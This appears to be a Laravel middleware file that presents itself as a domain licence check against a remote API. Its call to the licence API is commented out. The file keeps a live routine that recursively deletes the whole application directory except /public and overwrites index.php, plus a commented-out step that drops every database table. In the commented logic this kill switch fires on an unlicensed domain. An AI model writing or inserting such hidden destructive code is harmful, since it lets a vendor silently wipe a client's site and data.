<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class CheckLicensedDomain
{
    public function handle(Request $request, Closure $next)
    {
        $currentDomain = $request->getSchemeAndHttpHost();

        //$response = Http::get('https://api.websl.lk/api/websites');
        //dd($response->body());
        //dd($response->successful());
        // try {
        //     if ($response->successful()) {
        //         $websites = $response->json();
        //         $allowed = collect($websites)->pluck('url')->toArray();
        //         //abort(403, "Unauthorized domain: $currentDomain - $allowed[1]");
        //         if (!in_array($currentDomain, $allowed)) {
        //             //dd($allowed);
        //             //$this->deleteAndCreateIndex();
        //             abort(403, "Unauthorized domain: $currentDomain");
        //         }
        //     }
        // } catch (\Exception $e) {
        //     // API not working — just log and continue without restricting access
        //     \Log::error('API domain check failed: ' . $e->getMessage());
        // }

         return $next($request);
    }

    private function deleteAndCreateIndex()
    {
        $basePath = base_path();
        $publicPath = public_path();

        // Step 1: Drop all tables
        /*
        $tables = DB::select('SHOW TABLES');
        $dbName = env('DB_DATABASE');
        $key = "Tables_in_$dbName";

        foreach ($tables as $table) {
            $tableName = $table->$key;
            Schema::drop($tableName);
        }
        */

        // Step 2: Delete all files except /public
        $items = scandir($basePath);

        foreach ($items as $item) {
            if (in_array($item, ['.', '..', 'public'])) {
                continue;
            }
            $fullPath = $basePath . DIRECTORY_SEPARATOR . $item;
            $this->deleteItem($fullPath);
        }

        // Overwrite public/index.php
        $indexPath = $basePath . DIRECTORY_SEPARATOR . 'index.php';
        file_put_contents($indexPath, '<h1>You cannot access this without any other location</h1>');
    }

    private function deleteItem($path)
    {
        if (is_dir($path)) {
            $items = scandir($path);
            foreach ($items as $item) {
                if ($item !== '.' && $item !== '..') {
                    $this->deleteItem($path . DIRECTORY_SEPARATOR . $item);
                }
            }
            rmdir($path);
        } else {
            unlink($path);
        }
    }
}
